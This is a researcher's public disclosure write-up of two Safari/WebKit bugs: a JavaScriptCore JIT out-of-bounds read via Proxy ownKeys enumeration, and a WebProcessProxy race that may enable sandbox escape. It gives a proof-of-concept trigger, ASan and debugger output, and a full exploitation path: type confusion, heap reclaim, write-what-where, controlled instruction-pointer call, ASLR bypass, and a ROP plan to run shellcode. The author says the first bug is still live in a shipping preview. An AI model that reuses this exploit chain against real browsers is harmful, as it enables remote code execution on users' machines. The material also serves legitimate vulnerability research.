# Issue-198327
A Webkit RCE exploit and an SBX bug

***Timeline:***<br>
2019-04-27: submitted to the zdi.<br>
2019-05-19: submitted to ssd.<br>
2019-05-27: i read the patches at the webkit head branch.<br>
2019-05-27: i noitified the zdi & ssd.<br>
2019-05-28: sent the report to webkit.<br>
2019-05-30: as i got no response, and as this is fixed upstream, i have decided to publicly disclose this.<br>
2019-05-30: recieved an email from product-security@apple.<br>
2019-05-30: content removed.<br>
2019-06-08: after many tries to talk with apple w/o success i have decided to publicly disclose this for the following reasons:<br><br> 

a) <a href="https://github.com/MorteNoir1/virtualbox_e1000_0day#why">i agree with him...</a><br>
b) a gazillion dollar vendor is not offering a reward program for there products, forcing security researchers to resort to all sorts of reward programs (that are doing there best, but they don't have the vendors resources..), that can take anywhere from two months to more to disclose the vulnerabilty to the vendor. meanwhile we need to hold off zero days in there product without a fix - practialy exposing billions of there users to risk.<br>

so a question arise: why should i withhold this information if the vendor is telling me that my work has no value when he is not offering any sort of reward (even the most minimal) for the product???<br>

they only seem to care if the information is public, so lets have a conversation this way then..<br>

in addition, i wouldn't do the following if this would have affected the release (and i got those as well..) but let this be a flag for this problematic vendor (and this is not the first time this year that apple are getting this approach from researchers).<br>

with that sayed i think i can bring more profit to the general community by sharing this now when it's unpatched then later on. ( i would never do that to google or ms ). maybe this vendor would change idk..

***affected versions***

***1st bug***
to my knowlege this affects safari technology preview v82-v84.<br>
i practically begged apple not to push this into stable, but since the fix upstream this seems to be pushed throw two preview release's. so idk what they are thinking..<br>

***2nd bug***
this is fixed with preview v82, but i didn't keep note on when this bug was introduced, so idk if this affects the release or not..<br>

the leak code and exploit should work with:
https://webkit.org/blog/8921/release-notes-for-safari-technology-preview-82/<br>
Webkit branch: e7d79a7a1ac4a33cf90d7261877355d7b22f58ac <br>
but the vulnerability is still present in preview v84.<br>
the final code here should run on any affected version..<br>
when this would be fixed (both) i would edit this details.<br>
and publish all the js code i used (if this wont turn into shit posting 'zeroday' all over the internet)..<br>

# first bug

CVE-2019-XXXX: Apple Safari: JSC: JIT: JSPropertyNameEnumerator is using cached structure ids,<br>
when 'ownKeys' is inlined with a proxy causing out of bounds access.<br>

***a brief explanation of the bug:***

this was fixed here: <br>
https://github.com/WebKit/webkit/commit/80025fef96cb81fc3650c4da2230c624ac253937 <br>

poc triggers: <br>


```javascript

var o = {a:0};

function opt() {
            
    let p = new Proxy({},{ownKeys:(a)=>{return a;}});
    o.__proto__ = p;
    for (let x in o) {}
}

for (let t = 0; t <350;t++){
        opt();
}


```

<br>

***would produce the following:***

<br>

```c

    ==29150==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x41f8be002da6 bp 0x7ffeee49dc60 sp 0x7ffeee49db90 T0)
    ==29150==The signal is caused by a READ memory access.
    ==29150==Hint: address points to the zero page.
        #0 0x41f8be002da5  (<unknown module>)
        #1 0x104cae062 in llint_entry (JavaScriptCore:x86_64+0x32c5062)
        #2 0x104c9acb1 in vmEntryToJavaScript (JavaScriptCore:x86_64+0x32b1cb1)
        #3 0x104934078 in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) JITCodeInlines.h:38
        #4 0x10493198c in JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*) Interpreter.cpp:845
        #5 0x10524f974 in JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) Completion.cpp:141
        #6 0x10183607f in runWithOptions(GlobalObject*, CommandLine&, bool&) jsc.cpp:2632
        #7 0x1017c5f43 in jscmain(int, char**)::$_4::operator()(JSC::VM&, GlobalObject*, bool&) const jsc.cpp:3103
        #8 0x10176eb75 in int runJSC<jscmain(int, char**)::$_4>(CommandLine const&, bool, jscmain(int, char**)::$_4 const&) jsc.cpp:2961
        #9 0x10176af6d in jscmain(int, char**) jsc.cpp:3096
        #10 0x10176ad2d in main jsc.cpp:2456
        #11 0x7fff599ba3d4 in start (libdyld.dylib:x86_64+0x163d4)

    ==29150==Register values:
        rax = 0x0000000000000000  rbx = 0x00007ffeee49dea0  rcx = 0x27b165aebef800eb  rdx = 0x00007ffeee49dc60  
        rdi = 0x0000000000000000  rsi = 0x0000000000000000  rbp = 0x00007ffeee49dc60  rsp = 0x00007ffeee49db90  
        r8 = 0xf2f8f204f1f1f1f1   r9 = 0x00001fffddc93a70  r10 = 0x00000001076d3998  r11 = 0xffff000000000000  
        r12 = 0x000061a000000690  r13 = 0x000061100001bfc0  r14 = 0xffff000000000000  r15 = 0xffff000000000002  
        AddressSanitizer can not provide additional info.
        SUMMARY: AddressSanitizer: SEGV (<unknown module>) 
        ==29150==ABORTING
        Abort trap: 6
        

```

***Brief Analysis:***

if we look at the generated bytecode:

```c

        Generated Baseline JIT code for opt#BRDqTi:[0x62d00011c140->0x62d000093500, BaselineFunctionCall, 221], instruction count = 221
            Source: function opt() { function f(a,b) { return a; } let h = {ownKeys:f}; let tmp = {}; let p = new Proxy({},h); o.__proto__ = p; for (let x in o) { } }
            Code at [0x24efc05ff400, 0x24efc0601000):
    [   0] enter                  
    [   1] get_scope          loc4
    [   3] mov                loc5, loc4
    [   6] check_traps        
    [   7] mov                loc8, <JSValue()>(const0)
    [  10] mov                loc9, <JSValue()>(const0)
    [  13] mov                loc10, <JSValue()>(const0)
    [  16] new_func           loc11, loc4, 0
    [  20] mov                loc6, loc11
    [  23] new_object         loc11, 1
    [  27] put_by_id          loc11, 0, loc6, IsDirect
    [  33] mov                loc10, loc11
    [  36] new_object         loc8, 0
    [  40] resolve_scope      loc11, loc4, 1, GlobalProperty, 0
    [  47] get_from_scope     loc12, loc11, 1, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    [  55] new_object         loc15, 0
    [  59] mov                loc14, loc10
    [  62] mov                loc16, loc12
    [  65] construct          loc9, loc12, 3, 22
    [  71] resolve_scope      loc11, loc4, 2, GlobalProperty, 0
    [  78] get_from_scope     loc12, loc11, 2, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    [  86] put_by_id          loc12, 3, loc9, 
    [  92] mov                loc11, <JSValue()>(const0)
    [  95] resolve_scope      loc12, loc4, 2, GlobalProperty, 0
    [ 102] get_from_scope     loc13, loc12, 2, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    [ 110] mov                loc12, loc13
    [ 113] get_property_enumerator loc13, loc12
    [ 116] get_enumerable_length loc14, loc13
    [ 119] mov                loc15, Int32: 0(const1)
    [ 122] loop_hint          
    [ 123] check_traps        
    [ 124] less               loc17, loc15, loc14
    [ 128] jfalse             loc17, 23(->151)
    [ 131] has_indexed_property loc17, loc12, loc15
    [ 136] jfalse             loc17, 9(->145)
    [ 139] to_index_string    loc16, loc15
    [ 142] mov                loc11, loc16
    [ 145] inc                loc15
    [ 147] jmp                -25(->122)
    [ 149] jmp                70(->219)
    [ 151] mov                loc15, Int32: 0(const1)
    [ 154] enumerator_structure_pname loc16, loc13, loc15
    [ 158] loop_hint          
    [ 159] check_traps        
    [ 160] eq_null            loc17, loc16
    [ 163] jtrue              loc17, 24(->187)
    [ 166] has_structure_property loc17, loc12, loc16, loc13
    [ 171] jfalse             loc17, 6(->177)
    [ 174] mov                loc11, loc16
    [ 177] inc                loc15
    [ 179] enumerator_structure_pname loc16, loc13, loc15
    [ 183] jmp                -25(->158)
    [ 185] jmp                34(->219)
    [ 187] enumerator_generic_pname loc16, loc13, loc15
    [ 191] loop_hint          
    [ 192] check_traps        
    [ 193] eq_null            loc17, loc16
    [ 196] jtrue              loc17, 23(->219)
    [ 199] has_generic_property loc17, loc12, loc16
    [ 203] jfalse             loc17, 6(->209)
    [ 206] mov                loc11, loc16
    [ 209] inc                loc15
    [ 211] enumerator_generic_pname loc16, loc13, loc15
    [ 215] jmp                -24(->191)
    [ 217] jmp                2(->219)
    [ 219] ret                Undefined(const2)
    (End Of Main Path)
    (S) [   6] check_traps        
    (S) [  23] new_object         loc11, 1
    (S) [  27] put_by_id          loc11, 0, loc6, IsDirect
    (S) [  36] new_object         loc8, 0
    (S) [  40] resolve_scope      loc11, loc4, 1, GlobalProperty, 0
    (S) [  47] get_from_scope     loc12, loc11, 1, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    (S) [  55] new_object         loc15, 0
    (S) [  65] construct          loc9, loc12, 3, 22
    (S) [  78] get_from_scope     loc12, loc11, 2, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    (S) [  86] put_by_id          loc12, 3, loc9, 
    (S) [ 102] get_from_scope     loc13, loc12, 2, 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 0, 0
    (S) [ 122] loop_hint          
    (S) [ 123] check_traps        
    (S) [ 131] has_indexed_property loc17, loc12, loc15
    (S) [ 145] inc                loc15
    (S) [ 158] loop_hint          
    (S) [ 159] check_traps        
    (S) [ 166] has_structure_property loc17, loc12, loc16, loc13
    (S) [ 177] inc                loc15
    (S) [ 191] loop_hint          
    (S) [ 192] check_traps        
    (S) [ 209] inc                loc15
    (End Of Slow Path)

```

<br>

with lldb and we find:<br>

```c

    [ 154] enumerator_structure_pname loc16, loc13, loc15
          0x24efc05fff83: mov -0x80(%rbp), %rax
          0x24efc05fff87: mov -0x70(%rbp), %rsi
          0x24efc05fff8b: cmp 0x2c(%rsi), %eax
          0x24efc05fff8e: jb 0x24efc05fffa3
          0x24efc05fff94: mov $0x2, %rax
          0x24efc05fff9e: jmp 0x24efc05fffae
          0x24efc05fffa3: mov 0x8(%rsi), %rsi
          0x24efc05fffa7: movsxd %eax, %rax
          0x24efc05fffaa: mov (%rsi,%rax,8), %rax     <--- we die here ...
          0x24efc05fffae: mov %rax, -0x88(%rbp)
          
(lldb) run
Process 29224 launched: './jsc' (x86_64)
Process 29224 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
    frame #0: 0x0000472bed0038f8
->  0x472bed0038f8: movq   (%rsi,%rax,8), %rax
    0x472bed0038fc: movq   %rax, -0x88(%rbp)
    0x472bed003903: movabsq $0x62d00011c38c, %r11     ; imm = 0x62D00011C38C 
    0x472bed00390d: addl   $0x1, (%r11)
Target 0: (jsc) stopped.

```

we can see that: the property enumarator is called uppon the object in the proxy..<br>
the length is fatched from the cached one, so we can access memory OOB.<br>
while inlining two identical objects wont crash (i also use this fact to reclaim memory later on),<br>
if we would allocate two 'big' identical objects, and send a very small <br>
structured object in the end, after the function <br>
was already optimized .<br><br>

See the commit for more details.<br>

```c
lucy:bin akayn$ ./jsc ~/poc.js
AddressSanitizer:DEADLYSIGNAL
=================================================================
==29569==ERROR: AddressSanitizer: SEGV on unknown address 0x01d174000027 (pc 0x49a45b600032 bp 0x7ffee30efc50 sp 0x7ffee30efbb0 T0)
==29569==The signal is caused by a READ memory access.
    #0 0x49a45b600031  (<unknown module>)
    #1 0x11005b062 in llint_entry (JavaScriptCore:x86_64+0x32c5062)
    #2 0x110047cb1 in vmEntryToJavaScript (JavaScriptCore:x86_64+0x32b1cb1)
    #3 0x10fce1078 in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) JITCodeInlines.h:38
    #4 0x10fcde98c in JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*) Interpreter.cpp:845
    #5 0x1105fc974 in JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) Completion.cpp:141
    #6 0x10cbe407f in runWithOptions(GlobalObject*, CommandLine&, bool&) jsc.cpp:2632
    #7 0x10cb73f43 in jscmain(int, char**)::$_4::operator()(JSC::VM&, GlobalObject*, bool&) const jsc.cpp:3103
    #8 0x10cb1cb75 in int runJSC<jscmain(int, char**)::$_4>(CommandLine const&, bool, jscmain(int, char**)::$_4 const&) jsc.cpp:2961
    #9 0x10cb18f6d in jscmain(int, char**) jsc.cpp:3096
    #10 0x10cb18d2d in main jsc.cpp:2456
    #11 0x7fff599ba3d4 in start (libdyld.dylib:x86_64+0x163d4)

==29569==Register values:
rax = 0x000001d174000021  rbx = 0x00007ffee30efe80  rcx = 0x000062d000180500  rdx = 0x000049a45b60018d  
rdi = 0x00001fffdc61df38  rsi = 0x0000608000002720  rbp = 0x00007ffee30efc50  rsp = 0x00007ffee30efbb0  
 r8 = 0x00007ffee30ef200   r9 = 0x00001fffdc61de30  r10 = 0x0000000112a80998  r11 = 0x000062f00000d118  
r12 = 0x000062d000180500  r13 = 0x000062d00022b200  r14 = 0xffff000000000000  r15 = 0xffff000000000002  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (<unknown module>) 
==29569==ABORTING
Abort trap: 6
lucy:bin akayn$
```

After disscusing this with some i reallized that this explanation is not clear enough,<br>
so, to be precise:

a) the propertynameenumarator is called to iterate uppon this object:<br>
https://github.com/WebKit/webkit/blob/80025fef96cb81fc3650c4da2230c624ac253937/Source/JavaScriptCore/runtime/PropertyNameArray.h#L50<br>
b) when we jit compile the function, then it calls the propertynameenumarator with a trap result<br>
(computed before). but a proxy can clear the PropertyNameArray (linked above), and this is not taken into account.<br>
so we can basicaly access this object OOB.<br>

***exploitation***

at this point we got OOB Read, but we want more..<br>
We got Several ways to go here.<br>
i have notice the following behavure:<br>
while iterating over the oob elements, some of them are interpeted as Objects <br>
(the cache is really junk memory, at the time we access it,<br>
so what ever is the form of this memory would be interpeted as the form of that memory layout.).<br>
here is a poc for this <a href="/type_conf.js">type_conf.js</a>  

***when you run the release build you should see:***

```
lucy:bin akayn$ ./jsc ~/poc.js
typeof x:number
leaked memory: 4.628987547775967e-299
typeof x:number
leaked memory: 9.719576448981733e+204
object
success
INVALID                       <---- the output for
                                  describe(fake_object)
lucy:bin akayn$
```

***and in the debug build:***

```
lucy:bin akayn$ ./jsc ~/poc.js
typeof x:number
leaked memory: 4.6289875477759656e-299
typeof x:number
leaked memory: 7.186796064232505e-68
typeof x:number
leaked memory: -0.0000017285360272012563
object
success
INVALID
ASSERTION FAILED: value.isUndefinedOrNull()
.../Source/JavaScriptCore/bytecode/SpeculatedType.cpp(526) : JSC::SpeculatedType JSC::speculationFromValue(JSC::JSValue)
1   0x1091a3b79 WTFCrash
2   0x1041b1a80 WTF::BasicRawSentinelNode<Worker>::remove()
3   0x1058464d4 JSC::speculationFromValue(JSC::JSValue)
4   0x1056b7039 JSC::ValueProfileBase<1u>::computeUpdatedPrediction(JSC::ConcurrentJSLocker const&)
5   0x10572b8b5 JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11::operator()(JSC::ValueProfile&) const
6   0x10572f117 auto void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&)::operator()<JSC::OpCall::Metadata>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&) const
7   0x10572c3b9 void JSC::MetadataTable::forEach<JSC::OpCall, void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&)>(void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)::'lambda15'(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11&) const&)
8   0x1056aedca void JSC::CodeBlock::forEachValueProfile<JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11>(JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)::$_11 const&)
9   0x1056ade5b JSC::CodeBlock::updateAllPredictionsAndCountLiveness(unsigned int&, unsigned int&)
10  0x1056af5cc JSC::CodeBlock::updateAllValueProfilePredictions()
11  0x107c4ba71 JSC::LLInt::jitCompileAndSetHeuristics(JSC::CodeBlock*, JSC::ExecState*, unsigned int)
12  0x107c4b189 llint_loop_osr
13  0x107c42436 llint_entry
14  0x107c2f352 vmEntryToJavaScript
15  0x1078c3014 JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*)
16  0x1078c0d8f JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*)
17  0x1081e26e7 JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&)
18  0x10427d2dd runWithOptions(GlobalObject*, CommandLine&, bool&)
19  0x10420db14 jscmain(int, char**)::$_4::operator()(JSC::VM&, GlobalObject*, bool&) const
20  0x1041b6847 int runJSC<jscmain(int, char**)::$_4>(CommandLine const&, bool, jscmain(int, char**)::$_4 const&)
21  0x1041b334c jscmain(int, char**)
22  0x1041b310e main
23  0x7fff599ba3d5 start
24  0x2
Illegal instruction: 4
lucy:bin akayn$ 
```

***Note: that the later assert is because the dfg has time to optimize (because of the loop) types for the curropted cell blocks ..***

AGAIN: this is a dangaling pointer, that is read OOB, this is why the output for describe is as such..<br>
it has a partial backing storage, so the engine 'thinks' its an object.<br>

***exploitation approach:***

in order to turn this type confusion into anything usefull we first we need to control, <br>
or reclaim the dangling pointers, backing storage.<br>
this is true, because otherwise you cannot curropt this memory in any meaningfull way.<br>
to find out how to achive the following we have to consult with the allocator.<br>
after messing around with this poc for a while i observed the following:<br>
in the below code, the asan output for the uaf, is telling us that this<br>
memory chunk was allocated on the cache.<br>
Therefor, if we reallocate (in a similar manner) new objects 
we can replace the memory on the cache<br>

NOTE: this is not a use after free vuln, its an OOB, like i stated before. but as explained this is a dangling pointer, if we access its index 0, then getbyval would be called. getbyval would try to access the memory pointed by this pointer, but the backing storage was allocated on the cache, and we can free the cache by forcing garbage collection.<br>

Excpected result:<br>

```
/*
before the replacment:
                           
print(x[0]);
                   
=================================================================
==1570==ERROR: AddressSanitizer: heap-use-after-free on address 0x604002576529 at pc 0x00010224d103 bp 0x7ffeefbfcaf0 sp 0x7ffeefbfcae8
     READ of size 1 at 0x604002576529 thread T0
#0 0x10224d102 in operationGetByValOptimize (JavaScriptCore:x86_64+0x2081102)
#1 0x5b9790a08d73  (<unknown module>)
#2 0x1023b39e6 in llint_entry (JavaScriptCore:x86_64+0x21e79e6)
#3 0x1023a45b8 in vmEntryToJavaScript (JavaScriptCore:x86_64+0x21d85b8)
#4 0x101f52ec7 in JSC::Interpreter::executeProgram(JSC::SourceCode const&, JSC::ExecState*, JSC::JSObject*) (JavaScriptCore:x86_64+0x1d86ec7)
#5 0x1029bef6b in JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&, JSC::JSValue, WTF::NakedPtr<JSC::Exception>&) (JavaScriptCore:x86_64+0x27f2f6b)
#6 0x100012444 in jscmain(int, char**) (jsc:x86_64+0x100012444)
#7 0x10001048a in main (jsc:x86_64+0x10001048a)
#8 0x7fff793a53d4 in start (libdyld.dylib:x86_64+0x163d4)
   0x604002576529 is located 25 bytes inside of 34-byte region [0x604002576510,0x604002576532)
freed by thread T0 here:
    #0 0x1046bf11b in __sanitizer_mz_free (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5d11b)
    #1 0x1039f6534 in bmalloc::DebugHeap::free(void*) (JavaScriptCore:x86_64+0x382a534)
    
    #2 0x1039ef2b8 in bmalloc::Cache::deallocateSlowCaseNullCache(  <----------------------- bmalloc::Cache:: ...
            
            bmalloc::HeapKind, void*) (JavaScriptCore:x86_64+0x38232b8)           
                          
                                
SUMMARY: AddressSanitizer: heap-use-after-free (JavaScriptCore:x86_64+0x2081102) in operationGetByValOptimize
 Shadow bytes around the buggy address:
     0x1c08004aec50: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa
     0x1c08004aec60: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa
     0x1c08004aec70: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa
     0x1c08004aec80: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa
     0x1c08004aec90: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 00
   =>0x1c08004aeca0: fa fa fd fd fd[fd]fd fa fa fa fd fd fd fd fd fd
     0x1c08004aecb0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
     0x1c08004aecc0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
     0x1c08004aecd0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
     0x1c08004aece0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd
     0x1c08004aecf0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd                   
                   
                   
after the replacment:
    print(x[0])  ===  4.191714984059889e+242                   
*/
```

here is the code to observe this pattern <a href="/reclaimcache.js">here</a><br>
And a Simple WriteWhatWhere poc, that only 'spam' the free structure can be found here <a href="/www.js">www.js</a><br>

***NOTE: we didn't really had to talk about gigacage..***

***successfull run with the later should produce:***

```c
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
    frame #0: 0x0000000100911758 JavaScriptCore`JSC::putByVal(JSC::ExecState*, JSC::JSValue, JSC::JSValue, JSC::JSValue, JSC::ByValInfo*) + 264
JavaScriptCore`JSC::putByVal:
->  0x100911758 <+264>: movq   0x40(%rdi), %rax
    0x10091175c <+268>: movq   %rsi, %rdi
    0x10091175f <+271>: movq   %r12, %rsi
    0x100911762 <+274>: movl   %r15d, %edx
Target 0: (jsc) stopped.
(lldb) reg r
General Purpose Registers:
       rax = 0x000000010b300000
       rbx = 0x0001414141414141
       rcx = 0x0001414141414141
       rdx = 0x0000000003230300
       rdi = 0x0361616161616161
       
```

***Continue our exploitation approach:***

<br>

another thing that i have noitced, is that some of the pointers used to point<br>
to function, while others used to point to objects.<br>
you can observe this due to access to index 0 of the object.<br>
objects with full backing storage would not result with access violation, while<br>
other objects didn't have a fast indexing type at the prototype,<br>
because of this the program would try to get the information from the cell block<br>
and we would get segfaults.<br>
those objects (after debugging) were found to be function pointers.<br>
so we can try to replace the backing storage of a dangling pointer (one of those 'objects') <br>
controlled data and call the function: <a href="/call_primitive.html">call_primitive</a><br>
NOTE: this poc require about 400mb of ram heap spray.<br>
and a couple of seconds to run, but as such its not a 100% success rate.<br>
you can achieve a 100% success rate, but that would require about 2.1gb,<br>
and some more waiting as a result. this is more reliable when opening the browser<br>
for the first time..<br>

p.s: the upper bits can be controlled as well..<br>

***successfull run should produce:***

<br>

```c
Process 18155 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
    frame #0: 0x00000001087bd3a0 JavaScriptCore`JSC::handleHostCall(JSC::ExecState*, JSC::JSValue, JSC::CallLinkInfo*) + 272
JavaScriptCore`JSC::handleHostCall:
->  0x1087bd3a0 <+272>: movq   0x40(%rax), %rax
    0x1087bd3a4 <+276>: leaq   -0x48(%rbp), %rsi
    0x1087bd3a8 <+280>: movq   %rbx, %rdi
    0x1087bd3ab <+283>: callq  *0x30(%rax)
Target 0: (com.apple.WebKit.WebContent) stopped.
(lldb) reg r rax
     rax = 0x2042424242424242
(lldb) 
       
```

So.. at this point we got the ability to call arbitrary an address.<br>
we can't just spray the cache and hope for the best.<br>
lets go back to the begining, where we talked about the infoleak situation:<br>
if we won't gc, then we can access out of bounds memory.<br>
because this structures are large, then they are inlined in the function.
if we would access a different OOB index (by changing the size of the last object that we send the optimized function, 
the trapResult.addunchacked would only add a number of properties up to an index.)
this way the, we can leak memory allocated after the propertynamesbuffer.
if we would call the function with very large objects, then the propertynamearray would end up inlined in the function.<br>
by allocating objects within objects we can align known symbols and pointers after this buffer's end.<br>

![]({{site.baseurl}}/images/s/leakedptr.png)

this leaked pointer (and others) would always take the form of:

```
 0x17ff000107d831c8
 0x17ff000XXXXXXXXX
```

<br>

Where 0xXXXXXXXXX, would be our valid pointer.<br>
those tagged pointers that we can leak, are valid pointers <br>
allocated in JSC memory region.<br>
some of the time its JavaScriptCore'JSC::Symbols::iteratorSymbol<br>
in the following asseambly.<br>

```
->  0x11071c0f0 <+0>:  xorl   $0xf000000, %eax          ; imm = 0xF000000
```

furthermore, this Symbol sits in a known offset from jsc base address: 0xf6b0f0.<br>
so its it's fairly easy to derive the following (consider that other generic pointers can be leaked):<br>

***aslr bypass:***

```
leak address
if address.ends_with(known_signature)
  compute: addr - known_offset
else
  location.reload()
```

This process can be optimized further via optimizing the 'leak' function.<br><br>
the leak code can be found <a href="/leakbase.html">here</a>.<br>
using this heap feng shui i was able to leak the base address of jsc very reliable on v82.<br>
there are multiple ways to use this oob to bypass aslr, mainly because we can control the memory,<br>
allocated beyond this buffer.<br>


***how to finish the exploit?***

1) leak the address of a known pointer<br>
2) compute JavaScriptCore Base Address.<br>
3) compute rop gadgets.<br>
4) use our 'CALL' primitive to call the rop payload.<br>
<br>

to also bypass PAC with this bug (at this exploitation form) is a bit over the head.<br>
and frankly i just didn't have the time to test.<br>
but, its also possible to use the fake object from: <a href="/type_conf.js">type_conf.js</a> <br>
(after replacing the backing storage).<br>
to construct r/w primitives, so that might be the way to go.<br><br>

its interesting to note that with this bug we can trigger:<br>
1) a global buffer overflow (access the second fake object .toString).<br>
2) an heap buffer overflow (access the first fake object with some big index)<br>
3) a type confusion.<br>
4) an OOB read.<br>
5) use after free.<br>

with that sayed, different exploitation approach's can be done, such as:<br>
spray the global heap and curropt meaningful pointers.<br>
allocate objects on the cache right after the buffer and apply the above.<br>

also interesting to note that due to the allocator being predictable (bmalloc::cache),<br>
then exploitation of this bug is fairly easy.<br>

NOTE: i didn't use structure spray (duo to latest mitigations).<br>
thats also true for jit function overwrite..<br>

instead the ROP payload calls mmap with RWX protection and then memcpy,<br>
our shell code, and jmp to the new allocated payload,<br>
see more at the github repo..<br>

# second bug:

CVE-2019-XXXY: race conditions with WebKit::WebProcessProxy<br>
triggers memory corruption in the broker process. this might lead to sandbox escape:<br>

this was fixed here:<br>
https://github.com/WebKit/webkit/commit/a9bc221482f2c513e59e060653437d6bacfb73fe<br>

there is a race condition here with:

```c

void WebProcessProxy::didBecomeUnresponsive()
{
    m_isResponsive = NoOrMaybe::No;

    auto isResponsiveCallbacks = WTFMove(m_isResponsiveCallbacks); <-- page is still alive..

    for (auto& page : copyToVectorOf<RefPtr<WebPageProxy>>(m_pageMap.values())) <------- [1]
        page->processDidBecomeUnresponsive();

    bool isWebProcessResponsive = false;
    for (auto& callback : isResponsiveCallbacks)
        callback(isWebProcessResponsive);           <-- now the page crashed already,
                                                        and the callbacks are invalid
                                                        so rip go to hell..
}

go to the /broker_rip_to_hell
directory and run that poc then the broker $rip...
to reproduce open several tabs on localhost, after running:
$ sudo python sd.py


===================================================================   expected result:

Process:               Safari Technology Preview [13086]
Path:                  /Applications/Safari Technology Preview.app/Contents/MacOS/Safari Technology Preview
Identifier:            com.apple.SafariTechnologyPreview
Version:               12.2 (14608.1.23.1)
Build Info:            WebBrowser-7608001023001000~2
Code Type:             X86-64 (Native)
Parent Process:        ??? [1]
Responsible:           Safari Technology Preview [13086]
User ID:               501

Date/Time:             2019-05-16 00:48:47.615 +0300
OS Version:            Mac OS X 10.14.5 (18F132)
Report Version:        12
Bridge OS Version:     3.5 (16P5125)
Anonymous UUID:        1F9A2248-51EC-A896-954E-5EE87841A112


Time Awake Since Boot: 170000 seconds

System Integrity Protection: disabled

Crashed Thread:        0  Dispatch queue: com.apple.main-thread

Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
Exception Codes:       KERN_INVALID_ADDRESS at 0xfffffffffffffff8
Exception Note:        EXC_CORPSE_NOTIFY

Termination Signal:    Segmentation fault: 11
Termination Reason:    Namespace SIGNAL, Code 0xb
Terminating Process:   exc handler [13086]

VM Regions Near 0xfffffffffffffff8:
--> shared memory          00007fffffe1a000-00007fffffe1b000 [    4K] r-x/r-x SM=SHM  
    

Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
0   ???                               0xfffffffffffffff8 0 + 18446744073709551608
1   com.apple.WebKit                  0x000000010388ffe7 WebKit::WebProcessProxy::didBecomeUnresponsive() + 347
2   com.apple.JavaScriptCore          0x0000000101fbcc63 WTF::RunLoop::TimerBase::timerFired(__CFRunLoopTimer*, void*) + 35
3   com.apple.CoreFoundation          0x00007fff313d7a60 __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 20
4   com.apple.CoreFoundation          0x00007fff313d760c __CFRunLoopDoTimer + 851
5   com.apple.CoreFoundation          0x00007fff313d7152 __CFRunLoopDoTimers + 330
6   com.apple.CoreFoundation          0x00007fff313b8362 __CFRunLoopRun + 2130
7   com.apple.CoreFoundation          0x00007fff313b78be CFRunLoopRunSpecific + 455
8   com.apple.HIToolbox               0x00007fff306a396b RunCurrentEventLoopInMode + 292
9   com.apple.HIToolbox               0x00007fff306a36a5 ReceiveNextEventCommon + 603
10  com.apple.HIToolbox               0x00007fff306a3436 _BlockUntilNextEventMatchingListInModeWithFilter + 64
11  com.apple.AppKit                  0x00007fff2ea3d987 _DPSNextEvent + 965
